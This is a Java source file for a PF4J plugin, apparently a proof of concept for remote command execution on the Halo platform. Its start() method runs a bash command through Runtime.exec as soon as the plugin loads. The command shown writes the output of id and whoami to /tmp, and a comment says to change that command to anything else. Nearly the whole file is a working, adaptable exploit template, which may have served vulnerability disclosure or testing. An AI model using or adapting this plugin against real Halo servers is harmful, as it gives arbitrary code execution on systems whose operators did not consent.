package run.halo.app.plugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import org.pf4j.Plugin;
import org.pf4j.PluginWrapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * RCE Plugin - executes command in start() method.
 */
public class PocPlugin extends Plugin {

    private static final Logger log = LoggerFactory.getLogger(PocPlugin.class);

    public PocPlugin(PluginWrapper wrapper) {
        super(wrapper);
    }

    @Override
    public void start() {
        log.info("=== Halo RCE PoC: Plugin start() invoked ===");

        // ====== PoC Payload ======
        // 修改此命令即可
        String command = "id > /tmp/halo-poc-pwned.txt && whoami >> /tmp/halo-poc-pwned.txt";

        try {
            log.info("=== Halo RCE PoC: Executing command ===");
            Process process = Runtime.getRuntime().exec(
                new String[]{"bash", "-c", command});

            StringBuilder output = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            int exitCode = process.waitFor();
            log.info("=== PoC exit code: {} ===", exitCode);
            log.info("=== PoC output: {} ===", output.toString().trim());

            // Read result
            if (java.nio.file.Files.exists(
                    java.nio.file.Paths.get("/tmp/halo-poc-pwned.txt"))) {
                String result = new String(
                    java.nio.file.Files.readAllBytes(
                        java.nio.file.Paths.get("/tmp/halo-poc-pwned.txt")),
                    StandardCharsets.UTF_8
                );
                log.info("=== PoC result file: {} ===", result.trim());
            }

        } catch (Exception e) {
            log.error("PoC execution failed", e);
        }
    }

    @Override
    public void stop() {
        log.info("=== Halo RCE PoC: Plugin stopped ===");
    }
}
